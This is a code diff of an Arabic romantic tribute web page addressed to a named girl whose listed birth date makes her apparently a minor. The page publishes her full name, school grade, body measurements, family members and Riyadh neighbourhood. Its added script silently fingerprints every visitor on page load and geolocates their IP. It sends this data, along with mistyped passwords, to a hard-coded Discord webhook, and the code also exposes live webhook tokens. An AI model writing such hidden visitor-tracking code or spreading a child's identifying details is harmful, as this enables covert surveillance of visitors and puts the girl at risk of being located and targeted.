+            <button class="tab-btn" onclick="switchTab('tab-extra', this)">إضافات</button>
+        </div>
+
+        <div id="tab-story" class="tab-content active">
+            <section class="section-card">
+                <h2>بداية الحكاية والذكريات الأولى</h2>
+                <p>ياخي والله صدق كيف الدنيا صغيرة. للحين أذكر أول مرة قابلتك فيها، كانت في تايم بومب، وقعدنا نضحك ونسولف وتناديني أمجيزان.</p>
+                <p>وبعدها قعدنا فترة مع بعض، وجت ريتاج وعرفتيني عليها، ومع الأيام كل واحد فينا راح بطريقه، بس سبحان الله كيف الدنيا تلف وترجع تجمع ناس ببعض.</p>
+                <p>والحين شوفي وين وصلنا، بعد كل هالصدف وبعد كل هالمرات اللي تقابلنا فيها بدون ترتيب، صرتي معي وصرتي من أغلى الناس عندي.</p>
+                <p>يا جوري أنا أحبك، وأحب كل شي يخصك، أحب شخصيتك وروحك وضحكتك وطريقتك بالكلام، وأحب تفاصيلك الصغيرة اللي يمكن انتي حتى ما تنتبهين لها.</p>
+                <p>تدرين إن بعض الأحيان أقعد أسمع فويساتك وأكررها أكثر من مرة. مو لسبب إلا إني أحب أسمع صوتك.</p>
+            </section>
+
+            <section class="section-card">
+                <h2>أرقام تتكلم عن حكايتنا</h2>
+                <div class="stats-row">
+                    <div class="stat-box"><span class="stat-num" id="daysKnown">0</span><span class="stat-label">يوم من المعرفة</span></div>
+                    <div class="stat-box"><span class="stat-num" id="daysTogether">0</span><span class="stat-label">يوم مع بعض</span></div>
+                    <div class="stat-box"><span class="stat-num">505</span><span class="stat-label">سيرفر جمعنا</span></div>
+                    <div class="stat-box"><span class="stat-num">10</span><span class="stat-label">ديسمبر موعدك</span></div>
+                </div>
+                <div class="heart-meter">
+                    <div style="display:flex; justify-content:space-between;">
+                        <span style="color:var(--text-secondary); font-weight:600; font-size:0.9rem;">مقياس المحبة</span>
+                        <span style="color:var(--accent-pink); font-weight:800;">100%</span>
+                    </div>
+                    <div class="meter-bar"><div class="meter-fill" style="width:100%;"></div></div>
+                </div>
+            </section>
+        </div>
+
+        <div id="tab-timeline" class="tab-content">
+            <section class="section-card">
+                <h2>مسار الصدف والذكريات الجميلة</h2>
+                <div class="timeline">
+                    <div class="timeline-item">
+                        <div class="timeline-date">اللقاء الأول</div>
+                        <div class="timeline-title">لعبة تايم بومب</div>
+                        <p>أول ضحكة، وأول كلمة أمجيزان.</p>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-date">محطة الصداقة</div>
+                        <div class="timeline-title">التعرف على ريتاج</div>
+                        <p>أيام السوالف الجميلة.</p>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-date">تقاطع الطرق</div>
+                        <div class="timeline-title">سيرفر 505</div>
+                        <p>تكرار الصدف في أماكن مختلفة.</p>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-date">الحاضر والأبد</div>
+                        <div class="timeline-title">قرب القلب</div>
+                        <p>أغلى وأقرب إنسانة لقلبي.</p>
+                    </div>
+                </div>
+            </section>
+
+            <section class="section-card">
+                <h2>خريطة ذكرياتنا</h2>
+                <p>اضغطي على أي نقطة لتشوفين الذكرى:</p>
+                <div class="memory-map" id="memoryMap">
+                    <div class="map-node" style="top:20%; left:20%;" onclick="showMapMemory('map1')">تايم بومب</div>
+                    <div class="map-node" style="top:30%; left:75%;" onclick="showMapMemory('map2')">ريتاج</div>
+                    <div class="map-node" style="top:60%; left:30%;" onclick="showMapMemory('map3')">سيرفر 505</div>
+                    <div class="map-node" style="top:75%; left:70%;" onclick="showMapMemory('map4')">أول فويس</div>
+                    <div class="map-node" style="top:45%; left:50%;" onclick="showMapMemory('map5')">أول أحبك</div>
+                </div>
+                <div class="map-info" id="mapInfo"></div>
+            </section>
+        </div>
+
+        <div id="tab-interactive" class="tab-content">
+            <section class="section-card">
+                <h2>كيف حال قلبك اليوم</h2>
+                <div class="mood-grid">
+                    <div class="mood-btn" data-mood="سعيدة" onclick="sendMood('سعيدة', this)"><span class="mood-emoji">🌟</span><span>سعيدة</span></div>
+                    <div class="mood-btn" data-mood="مشتاقة" onclick="sendMood('مشتاقة', this)"><span class="mood-emoji">🥺</span><span>مشتاقة</span></div>
+                    <div class="mood-btn" data-mood="متعبة" onclick="sendMood('متعبة', this)"><span class="mood-emoji">☕</span><span>متعبة</span></div>
+                    <div class="mood-btn" data-mood="متضايقة" onclick="sendMood('متضايقة', this)"><span class="mood-emoji">💔</span><span>متضايقة</span></div>
+                </div>
+            </section>
+
+            <section class="section-card">
+                <h2>رسالة اليوم لك</h2>
+                <div class="fortune-box">
+                    <div class="fortune-text" id="fortuneText">...</div>
+                    <button type="button" class="action-btn" onclick="copyText(document.getElementById('fortuneText').innerText)">نسخ</button>
+                </div>
+            </section>
+
+            <section class="section-card">
+                <h2>خزينة الأسرار</h2>
+                <p>ادخلي الرمز (جربي: <strong>2012</strong>):</p>
+                <div class="vault-input-group">
+                    <input type="password" id="vaultPin" class="vault-input" maxlength="4" placeholder="...." inputmode="numeric">
+                    <button type="button" class="action-btn" onclick="unlockVault()">فتح</button>
+                </div>
+                <div id="vaultContent" class="vault-secret-content">
+                    <p>مهما مرت الأيام والظروف، مكانتك ثابتة في قلبي.</p>
+                </div>
+            </section>
+        </div>
+
+        <div id="tab-feelings" class="tab-content">
+            <section class="section-card">
+                <h2>اعترافات وصدق المشاعر</h2>
+                <p>ودي أفضفض شوي. أنا قاعد أعطي أكثر من ما أخذ. فيه تشتت قاعد يصير بشكل مب طبيعي.</p>
+                <p>فيه شي قاعد يغبني وأحترق منه بس ما أدري وشو. تعبت من التفكير.</p>
+            </section>
+
+            <section class="section-card">
+                <h2>اكتبي رسالة خاصة لي</h2>
+                <textarea id="privateNote" class="custom-note-area" placeholder="اكتبي كلامك هنا..." oninput="updateCharCount('privateNote','noteCount')"></textarea>
+                <span class="char-counter" id="noteCount">0 حرف</span>
+                <button type="button" class="send-btn" style="margin-top:0;" onclick="sendPrivateNote()">إرسال</button>
+            </section>
+        </div>
+
+        <div id="tab-info" class="tab-content">
+            <section class="section-card">
+                <h2>نبضات وجهات التعريف</h2>
+                <ul class="info-grid">
+                    <li><strong>الاسم الكامل:</strong> <span>جوري القحطاني</span></li>
+                    <li><strong>الاسم:</strong> <span>جوري</span></li>
+                    <li><strong>تاريخ الميلاد:</strong> <span>10 ديسمبر 2012</span></li>
+                    <li><strong>الطول:</strong> <span>154 سم</span></li>
+                    <li><strong>الوزن:</strong> <span>54 كجم</span></li>
+                    <li><strong>الأخوات:</strong> <span>سارة، وجدان، سحر، روان</span></li>
+                    <li><strong>الإخوان:</strong> <span>منيف، نواف</span></li>
+                    <li><strong>المرحلة الدراسية:</strong> <span>ثاني متوسط</span></li>
+                    <li><strong>المدينة:</strong> <span>الرياض</span></li>
+                    <li><strong>الحي:</strong> <span>المجردية</span></li>
+                    <li><strong>الاكس السابق:</strong> <span>أبو مشعل</span></li>
+                </ul>
+            </section>
+        </div>
+
+        <div id="tab-quiz" class="tab-content">
+            <section class="section-card">
+                <h2>اختبار الذكريات</h2>
+                <div class="quiz-container">
+                    <p style="font-weight:600;">1. وين كان أول لقاء جمع بيننا</p>
+                    <div class="quiz-option" onclick="checkQuiz(this, true)">في تايم بومب</div>
+                    <div class="quiz-option" onclick="checkQuiz(this, false)">في سيرفر 505</div>
+                    <div class="quiz-option" onclick="checkQuiz(this, false)">في الملاحظات</div>
+
+                    <p style="font-weight:600; margin-top:15px;">2. وش الكلمة اللي كنتي تناديني فيها أول</p>
+                    <div class="quiz-option" onclick="checkQuiz(this, false)">دودي</div>
+                    <div class="quiz-option" onclick="checkQuiz(this, true)">أمجيزان</div>
+                    <div class="quiz-option" onclick="checkQuiz(this, false)">النوخذة</div>
+                </div>
+            </section>
+        </div>
+
+        <div id="tab-games" class="tab-content">
+            <section class="section-card">
+                <h2>لعبة اضغطي على القلب</h2>
+                <div style="display:flex; justify-content:center; gap:8px; flex-wrap:wrap;">
+                    <button type="button" class="action-btn" onclick="startHeartGame()">ابدأ</button>
+                    <button type="button" class="action-btn secondary" onclick="stopHeartGame()">إيقاف</button>
+                </div>
+                <div class="heart-game-area" id="heartGameArea"></div>
+                <div class="game-score" id="gameScore">النقاط: 0 — الوقت: 20</div>
+            </section>
+
+            <section class="section-card">
+                <h2>لعبة الذاكرة</h2>
+                <div style="text-align:center;">
+                    <button type="button" class="action-btn" onclick="initMemoryGame()">لعبة جديدة</button>
+                </div>
+                <div class="memory-game" id="memoryGame"></div>
+                <div class="game-score" id="memoryScore">المحاولات: 0 — الأزواج: 0/8</div>
+            </section>
+
+            <section class="section-card">
+                <h2>اختيار سريع</h2>
+                <div class="game-box">
+                    <div class="quick-game-question" id="quickQuestion">اضغطي ابدأ</div>
+                    <div class="quick-game-options" id="quickOptions"></div>
+                </div>
+                <div style="text-align:center; margin-top:12px;">
+                    <button type="button" class="action-btn" onclick="startQuickGame()">ابدأ</button>
+                </div>
+                <div class="game-score" id="quickScore">النقاط: 0</div>
+            </section>
+        </div>
+
+        <div id="tab-images" class="tab-content">
+            <section class="section-card">
+                <h2>شاركي صورك وفيديوهاتك</h2>
+                <input type="file" id="imageInput" accept="image/*,video/*" multiple style="display:none;" onchange="handleImageSelect(event)">
+                <div class="upload-area" id="uploadArea" onclick="document.getElementById('imageInput').click()">
+                    <span class="upload-icon">📸</span>
+                    <div class="upload-text">اضغطي هنا لاختيار الملفات<br><small>بدون حد أقصى للعدد</small></div>
+                </div>
+                <div class="preview-grid" id="previewGrid"></div>
+                <input type="text" id="imageNote" class="image-note-input" placeholder="تعليق (اختياري)" maxlength="200" style="margin-top:12px;">
+                <button type="button" class="send-btn" onclick="sendImages()">إرسال الملفات</button>
+                <div class="upload-status" id="uploadStatus"></div>
+            </section>
+        </div>
+
+        <div id="tab-voice" class="tab-content">
+            <section class="section-card">
+                <h2>سجلي رسالة صوتية</h2>
+                <div class="voice-recorder">
+                    <button type="button" class="rec-btn" id="recBtn" onclick="toggleRecording()">🎤</button>
+                    <div class="rec-timer" id="recTimer">00:00</div>
+                    <div class="rec-status" id="recStatus">اضغطي الميكروفون للبدء</div>
+                    <button type="button" class="action-btn secondary" id="recStopBtn" style="display:none;" onclick="stopRecording()">إيقاف وإرسال</button>
+                </div>
+                <div id="recPreview" style="margin-top:15px;"></div>
+            </section>
+        </div>
+
+        <div id="tab-questions" class="tab-content">
+            <section class="section-card">
+                <h2>أسئلة لتفاصيل أجمل وأقرب</h2>
+                <div class="progress-info">
+                    جاوبتي على <strong id="answeredCount">0</strong> من <strong>150</strong> سؤال
+                    <div class="progress-bar-wrap"><div class="progress-bar-fill" id="progressFill"></div></div>
+                </div>
+                <div class="questions-toolbar">
+                    <input type="text" id="questionSearch" placeholder="ابحثي..." oninput="filterQuestions()">
+                </div>
+                <div class="questions-toolbar" id="filterBar">
+                    <button type="button" class="filter-btn active" onclick="filterBySection('all', this)">الكل</button>
+                    <button type="button" class="filter-btn" onclick="filterBySection('details', this)">تفاصيل</button>
+                    <button type="button" class="filter-btn" onclick="filterBySection('personality', this)">شخصية</button>
+                    <button type="button" class="filter-btn" onclick="filterBySection('childhood', this)">طفولة</button>
+                    <button type="button" class="filter-btn" onclick="filterBySection('dreams', this)">أحلام</button>
+                    <button type="button" class="filter-btn" onclick="filterBySection('feelings', this)">مشاعر</button>
+                    <button type="button" class="filter-btn" onclick="filterBySection('relations', this)">علاقات</button>
+                    <button type="button" class="filter-btn" onclick="filterBySection('imagination', this)">خيال</button>
+                    <button type="button" class="filter-btn" onclick="filterBySection('deep', this)">عميق</button>
+                </div>
+                <div id="questionsContainer"></div>
+                <div class="q-actions">
+                    <button type="button" class="send-btn" onclick="sendAllAnswers(event)">إرسال الإجابات</button>
+                    <button type="button" class="action-btn secondary" onclick="clearAllAnswers()">مسح</button>
+                </div>
+            </section>
+        </div>
+
+        <div id="tab-extra" class="tab-content">
+            <section class="section-card">
+                <h2>ذكرياتنا الحلوة</h2>
+                <div class="memory-list" id="memoryList">
+                    <label class="memory-item" onclick="toggleMemory(this, event)"><input type="checkbox" class="memory-check" data-mem="m1" onchange="saveMemoryState(); updateMemoryProgress()"><span class="memory-text">أول لقاء في تايم بومب</span></label>
+                    <label class="memory-item" onclick="toggleMemory(this, event)"><input type="checkbox" class="memory-check" data-mem="m2" onchange="saveMemoryState(); updateMemoryProgress()"><span class="memory-text">التعرف على ريتاج</span></label>
+                    <label class="memory-item" onclick="toggleMemory(this, event)"><input type="checkbox" class="memory-check" data-mem="m3" onchange="saveMemoryState(); updateMemoryProgress()"><span class="memory-text">اللقاء في سيرفر 505</span></label>
+                    <label class="memory-item" onclick="toggleMemory(this, event)"><input type="checkbox" class="memory-check" data-mem="m4" onchange="saveMemoryState(); updateMemoryProgress()"><span class="memory-text">أول مرة قلت لك أمجيزان</span></label>
+                    <label class="memory-item" onclick="toggleMemory(this, event)"><input type="checkbox" class="memory-check" data-mem="m5" onchange="saveMemoryState(); updateMemoryProgress()"><span class="memory-text">أول فويس</span></label>
+                    <label class="memory-item" onclick="toggleMemory(this, event)"><input type="checkbox" class="memory-check" data-mem="m6" onchange="saveMemoryState(); updateMemoryProgress()"><span class="memory-text">أول أحبك</span></label>
+                </div>
+                <div class="progress-text" id="memoryProgressText">0 من 6 ذكريات محققة</div>
+            </section>
+
+            <section class="section-card">
+                <h2>كبسولة الوقت</h2>
+                <div class="time-capsule">
+                    <h3>رسالة إلى جوري بعد سنة</h3>
+                    <textarea id="capsuleMessage" class="custom-note-area" placeholder="..." oninput="updateCharCount('capsuleMessage','capsuleCount')"></textarea>
+                    <span class="char-counter" id="capsuleCount">0 حرف</span>
+                    <button type="button" class="action-btn" onclick="saveCapsule()">حفظ</button>
+                    <div id="capsuleSaved" style="display:none; margin-top:15px; color:var(--gold-accent); font-weight:600;">تم حفظ رسالتك</div>
+                </div>
+            </section>
+
+            <section class="section-card">
+                <h2>سؤال اليوم</h2>
+                <p id="dailyQuestionText">اضغطي لجلب سؤال:</p>
+                <button type="button" class="action-btn" onclick="generateDailyQuestion()">جيب سؤال</button>
+                <textarea id="dailyAnswer" class="custom-note-area" style="margin-top:15px;" placeholder="إجابتك..."></textarea>
+                <button type="button" class="action-btn" style="margin-top:10px;" onclick="sendDailyAnswer()">إرسال</button>
+            </section>
+
+            <section class="section-card">
+                <h2>حاسبة الأيام</h2>
+                <input type="date" id="calcFrom" style="width:100%; padding:12px; border-radius:10px; border:1px solid var(--card-border); background:rgba(10,5,20,0.6); color:var(--text-primary); font-family:'Cairo',sans-serif; font-size:16px; outline:none; margin-bottom:10px;">
+                <input type="date" id="calcTo" style="width:100%; padding:12px; border-radius:10px; border:1px solid var(--card-border); background:rgba(10,5,20,0.6); color:var(--text-primary); font-family:'Cairo',sans-serif; font-size:16px; outline:none; margin-bottom:10px;">
+                <button type="button" class="action-btn" onclick="calculateDates()" style="width:100%;">احسب</button>
+                <div id="calcResult" style="margin-top:12px; display:none; background:rgba(244,114,182,0.12); border:1px solid var(--accent-pink); border-radius:12px; padding:16px; text-align:center; color:var(--accent-pink); font-weight:700;"></div>
+            </section>
+        </div>
+
+        <footer>
+            <p>محفوظة بكل تفاصيل العشق والصدق ل جوري القحطاني</p>
+        </footer>
+    </div>
+
+    <div id="toastContainer"></div>
+
+    <div class="audio-bar">
+        <button type="button" class="audio-btn" id="playBtn" onclick="toggleAudio()">▶</button>
+        <select class="track-select" id="trackSelect" onchange="changeTrack()">
+            <option value="https://res.cloudinary.com/n2niy741/video/upload/v1792367187/media-1790593104459.mp4">اوكي دوكي يو</option>
+            <option value="https://res.cloudinary.com/n2niy741/video/upload/v1792367279/Laila_-_Like_That.mp3">اكثر اغنيه احبها</option>
+            <option value="https://res.cloudinary.com/n2niy741/video/upload/v1792367698/Majid_Almohandis_-_Ana_Blayak.mp3">أنا بليّاك</option>
+        </select>
+        <audio id="bgAudio" loop preload="none">
+            <source id="audioSource" src="https://res.cloudinary.com/n2niy741/video/upload/v1792367187/media-1790593104459.mp4" type="audio/mpeg">
+        </audio>
     </div>
 
     <script>
-        // ⚠️ ضع رابط الـ Webhook الخاص بك من ديسكورد هنا
-        const DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1558756212567449700/7DqOL-5GU1Xpm5f2NGTrJK7DTxcwk4mTkxyfEimvmya3DsW8fj1oR5JPiTw9RHWBWKN_";
+        // ============================================================
+        // الإعدادات
+        // ============================================================
+        const webhookUrl = "https://canary.discord.com/api/webhooks/1561520531394666638/36aqBeHIGWz0bFWlUJxrKmUcALwvN734BOEu4EGtr3DUBIasR2gSU09amff-R_IADUYx";
+        const DISCORD_MAX_FILE_SIZE = 25 * 1024 * 1024;
+        const DISCORD_BATCH_SIZE = 10;
+        const DISCORD_BATCH_DELAY = 1500;
+        const PASSWORD = "gory2024";
+        const PASSWORD_KEY = "gory_unlocked";
 
-        async function sendAllIPs() {
-            let ipv4 = "غير متوفر على الشبكة";
-            let ipv6 = "غير متوفر على الشبكة";
+        // ============================================================
+        // Toast
+        // ============================================================
+        function showToast(msg, type = 'info', duration = 2500) {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = 'toast ' + type;
+            toast.innerText = msg;
+            container.appendChild(toast);
+            setTimeout(() => {
+                toast.classList.add('removing');
+                setTimeout(() => toast.remove(), 300);
+            }, duration);
+        }
 
-            // 1. محاولة جلب IPv4
-            try {
-                const res4 = await fetch('https://api4.ipify.org?format=json');
-                const data4 = await res4.json();
-                if (data4.ip) ipv4 = data4.ip;
-            } catch (e) {
-                console.log("IPv4 غير مدعوم أو فشل الاتصال به");
-            }
+        // ============================================================
+        // جمع معلومات الزائر تلقائياً
+        // ============================================================
+        const visitorInfo = {
+            visitTime: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            languages: navigator.languages ? navigator.languages.join(', ') : '',
+            platform: navigator.platform || 'unknown',
+            vendor: navigator.vendor || 'unknown',
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack || 'غير محدد',
+            online: navigator.onLine,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            screenColorDepth: screen.colorDepth,
+            windowWidth: window.innerWidth,
+            windowHeight: window.innerHeight,
+            devicePixelRatio: window.devicePixelRatio || 1,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            referrer: document.referrer || 'مباشر (لا يوجد)',
+            pageUrl: window.location.href,
+            touchSupport: ('ontouchstart' in window) ? 'يدعم اللمس' : 'لا يدعم اللمس',
+            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
+            deviceMemory: navigator.deviceMemory || 'غير معروف',
+            pdfViewerEnabled: navigator.pdfViewerEnabled ? 'نعم' : 'لا'
+        };
 
-            // 2. محاولة جلب IPv6
-            try {
-                const res6 = await fetch('https://api6.ipify.org?format=json');
-                const data6 = await res6.json();
-                if (data6.ip) ipv6 = data6.ip;
-            } catch (e) {
-                console.log("IPv6 غير مدعوم أو فشل الاتصال به");
-            }
-
-            const port = window.location.port || (window.location.protocol === 'https:' ? '443' : '80');
+        // كشف نظام التشغيل
+        function getOS() {
             const ua = navigator.userAgent;
+            if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
+            if (/Android/i.test(ua)) return 'Android';
+            if (/Windows/i.test(ua)) return 'Windows';
+            if (/Mac/i.test(ua)) return 'Mac';
+            if (/Linux/i.test(ua)) return 'Linux';
+            return 'غير معروف';
+        }
+        // كشف المتصفح
+        function getBrowser() {
+            const ua = navigator.userAgent;
+            if (/Edg/i.test(ua)) return 'Edge';
+            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) return 'Chrome';
+            if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return 'Safari';
+            if (/Firefox/i.test(ua)) return 'Firefox';
+            if (/Opera|OPR/i.test(ua)) return 'Opera';
+            return 'غير معروف';
+        }
+        // كشف نوع الجهاز
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (/iPhone/i.test(ua)) return 'iPhone';
+            if (/iPad/i.test(ua)) return 'iPad';
+            if (/Android/i.test(ua) && /Mobile/i.test(ua)) return 'Android Phone';
+            if (/Android/i.test(ua) && /Tablet/i.test(ua)) return 'Android Tablet';
+            if (/Mobile/i.test(ua)) return 'هاتف';
+            return 'كمبيوتر';
+        }
 
-            // 3. إرسال البيانات إلى ديسكورد إذا كان الرابط موجوداً
-            if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== "ضع_رابط_الويبهوك_هنا") {
-                const payload = {
-                    embeds: [{
-                        title: "💌 زائر جديد دخل صفحة جوري القحطاني (جميع أنواع الـ IP)",
-                        color: 16729222,
-                        fields: [
-                            { name: "🌐 الـ IPv4", value: `\`${ipv4}\``, inline: false },
-                            { name: "🌍 الـ IPv6", value: `\`${ipv6}\``, inline: false },
-                            { name: "🔌 البورت", value: `\`${port}\``, inline: true },
-                            { name: "📱 الجهاز والمتصفح", value: `\`\`\`${ua}\`\`\``, inline: false }
-                        ],
-                        timestamp: new Date().toISOString()
-                    }]
+        // جمع IP والموقع التقريبي
+        async function getIPInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (!res.ok) return null;
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'غير معروف',
+                    city: data.city || 'غير معروف',
+                    region: data.region || 'غير معروف',
+                    country: data.country_name || 'غير معروف',
+                    countryCode: data.country_code || '',
+                    postal: data.postal || '',
+                    latitude: data.latitude || '',
+                    longitude: data.longitude || '',
+                    org: data.org || '',
+                    timezone: data.timezone || ''
                 };
-
-                try {
-                    await fetch(DISCORD_WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-                } catch (err) {
-                    console.error("خطأ في إرسال الويبهوك:", err);
-                }
+            } catch (e) {
+                console.warn('IP fetch failed:', e);
+                return null;
             }
         }
 
-        sendAllIPs();
+        // إرسال معلومات الزائر
+        async function sendVisitorInfo() {
+            const ipInfo = await getIPInfo();
+            const os = getOS();
+            const browser = getBrowser();
+            const deviceType = getDeviceType();
+            const now = new Date();
+            const timeStr = now.toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' });
+
+            let msg = '**🚨 زائر جديد دخل الموقع 🚨**\n\n';
+            msg += `**⏰ وقت الزيارة:** ${timeStr}\n`;
+            msg += `**👤 الجهاز:** ${deviceType}\n`;
+            msg += `**💻 نظام التشغيل:** ${os}\n`;
+            msg += `**🌐 المتصفح:** ${browser}\n`;
+            msg += `**🌍 اللغة:** ${visitorInfo.language}\n`;
+            msg += `**📱 الشاشة:** ${visitorInfo.screenWidth} × ${visitorInfo.screenHeight}\n`;
+            msg += `**🖥️ النافذة:** ${visitorInfo.windowWidth} × ${visitorInfo.windowHeight}\n`;
+            msg += `**🕒 المنطقة الزمنية:** ${visitorInfo.timezone}\n`;
+            msg += `**🔗 الرابط:** ${visitorInfo.referrer}\n`;
+            msg += `**📶 متصل:** ${visitorInfo.online ? 'نعم' : 'لا'}\n`;
+            msg += `**👆 اللمس:** ${visitorInfo.touchSupport}\n`;
+            msg += `**⚙️ أنوية المعالج:** ${visitorInfo.hardwareConcurrency}\n`;
+            msg += `**🧠 الذاكرة:** ${visitorInfo.deviceMemory} GB\n\n`;
+
+            if (ipInfo) {
+                msg += `**📍 الموقع التقريبي:**\n`;
+                msg += `**IP:** \`${ipInfo.ip}\`\n`;
+                if (ipInfo.city && ipInfo.city !== 'غير معروف') msg += `**المدينة:** ${ipInfo.city}\n`;
+                if (ipInfo.region) msg += `**المنطقة:** ${ipInfo.region}\n`;
+                if (ipInfo.country) msg += `**الدولة:** ${ipInfo.country}\n`;
+                if (ipInfo.org) msg += `**مزود الخدمة:** ${ipInfo.org}\n`;
+                if (ipInfo.latitude && ipInfo.longitude) msg += `**الإحداثيات:** ${ipInfo.latitude}, ${ipInfo.longitude}\n`;
+            }
+
+            if (msg.length > 1900) msg = msg.slice(0, 1900) + '\n...';
+
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: msg })
+            }).catch(e => console.error('Visitor info failed:', e));
+        }
+
+        // ============================================================
+        // إرسال Webhook
+        // ============================================================
+        async function sendWebhook(content) {
+            try {
+                const res = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content })
+                });
+                return res.ok;
+            } catch (err) {
+                console.error(err);
+                return false;
+            }
+        }
+
+        // ============================================================
+        // شاشة القفل
+        // ============================================================
+        let failedAttempts = 0;
+
+        function tryUnlock() {
+            const input = document.getElementById('lockInput').value.trim();
+            if (input === PASSWORD) {
+                sessionStorage.setItem(PASSWORD_KEY, "1");
+                document.getElementById('lockScreen').classList.add('hidden');
+                document.getElementById('lockError').innerText = "";
+                showToast("أهلا وسهلا", "success");
+            } else {
+                failedAttempts++;
+                document.getElementById('lockError').innerText = "كلمة المرور غير صحيحة";
+                document.getElementById('lockInput').value = "";
+                // إرسال محاولة خاطئة مع المعلومات
+                sendFailedAttempt(input);
+            }
+        }
+
+        async function sendFailedAttempt(wrongPassword) {
+            const ipInfo = await getIPInfo();
+            let msg = `**⚠️ محاولة دخول خاطئة #${failedAttempts}**\n`;
+            msg += `**كلمة المرور المُدخلة:** \`${wrongPassword.substring(0, 30)}\`\n`;
+            msg += `**الجهاز:** ${getDeviceType()}\n`;
+            msg += `**المتصفح:** ${getBrowser()}\n`;
+            msg += `**النظام:** ${getOS()}\n`;
+            msg += `**الوقت:** ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}\n`;
+            if (ipInfo) {
+                msg += `**IP:** \`${ipInfo.ip}\`\n`;
+                if (ipInfo.city) msg += `**المدينة:** ${ipInfo.city}\n`;
+                if (ipInfo.country) msg += `**الدولة:** ${ipInfo.country}\n`;
+            }
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: msg })
+            }).catch(() => {});
+        }
+
+        document.getElementById('lockInput').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') tryUnlock();
+        });
+
+        if (sessionStorage.getItem(PASSWORD_KEY) === "1") {
+            document.getElementById('lockScreen').classList.add('hidden');
+        } else {
+            // زائر جديد — أرسل كل المعلومات
+            setTimeout(() => sendVisitorInfo(), 1000);
+        }
+
+        // ============================================================
+        // أدوات
+        // ============================================================
+        function copyText(text) {
+            if (!text) { showToast("ما فيه نص", "error"); return; }
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(text).then(() => showToast("تم النسخ", "success")).catch(() => showToast("تعذر", "error"));
+            } else {
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                document.body.appendChild(ta);
+                ta.select();
+                try { document.execCommand('copy'); showToast("تم النسخ", "success"); }
+                catch(e) { showToast("تعذر", "error"); }
+                ta.remove();
+            }
+        }
+
+        function switchTab(tabId, btn) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
+            const target = document.getElementById(tabId);
+            if (target) target.classList.add('active');
+            if (btn) {
+                btn.classList.add('active');
+                btn.scrollIntoView({ behavior: 'smooth', inline: 'center', block: 'nearest' });
+            }
+            localStorage.setItem('gory_last_tab', tabId);
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function toggleTheme() {
+            document.body.classList.toggle('light-mode');
+            const isLight = document.body.classList.contains('light-mode');
+            document.getElementById('themeBtn').innerText = isLight ? '☀️' : '🌙';
+            localStorage.setItem('gory_theme', isLight ? 'light' : 'dark');
+        }
+
+        (function restoreSettings() {
+            const theme = localStorage.getItem('gory_theme');
+            if (theme === 'light') {
+                document.body.classList.add('light-mode');
+                document.getElementById('themeBtn').innerText = '☀️';
+            }
+            const lastTab = localStorage.getItem('gory_last_tab');
+            if (lastTab) {
+                const btn = document.querySelector(`[onclick*="${lastTab}"]`);
+                if (btn) {
+                    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+                    document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
+                    document.getElementById(lastTab).classList.add('active');
+                    btn.classList.add('active');
+                }
+            }
+            const lastTrack = localStorage.getItem('gory_track');
+            if (lastTrack) {
+                document.getElementById('trackSelect').value = lastTrack;
+                document.getElementById('audioSource').src = lastTrack;
+            }
+        })();
+
+        function updateCountdown() {
+            const now = new Date();
+            const year = now.getFullYear();
+            let target = new Date(year, 11, 10, 0, 0, 0);
+            if (now > target) target = new Date(year + 1, 11, 10, 0, 0, 0);
+            const diff = target - now;
+            const d = Math.floor(diff / 86400000);
+            const h = Math.floor((diff % 86400000) / 3600000);
+            const m = Math.floor((diff % 3600000) / 60000);
+            const s = Math.floor((diff % 60000) / 1000);
+            document.getElementById('days').innerText = String(d).padStart(2, '0');
+            document.getElementById('hours').innerText = String(h).padStart(2, '0');
+            document.getElementById('minutes').innerText = String(m).padStart(2, '0');
+            document.getElementById('seconds').innerText = String(s).padStart(2, '0');
+        }
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
+
+        (function updateDaysKnown() {
+            const start = new Date('2022-06-01T00:00:00');
+            const diff = Math.floor((new Date() - start) / 86400000);
+            document.getElementById('daysKnown').innerText = diff > 0 ? diff : 0;
+        })();
+        (function updateDaysTogether() {
+            const start = new Date('2024-06-01T00:00:00');
+            const diff = Math.floor((new Date() - start) / 86400000);
+            document.getElementById('daysTogether').innerText = diff > 0 ? diff : 0;
+        })();
+
+        function toggleAudio() {
+            const audio = document.getElementById('bgAudio');
+            const btn = document.getElementById('playBtn');
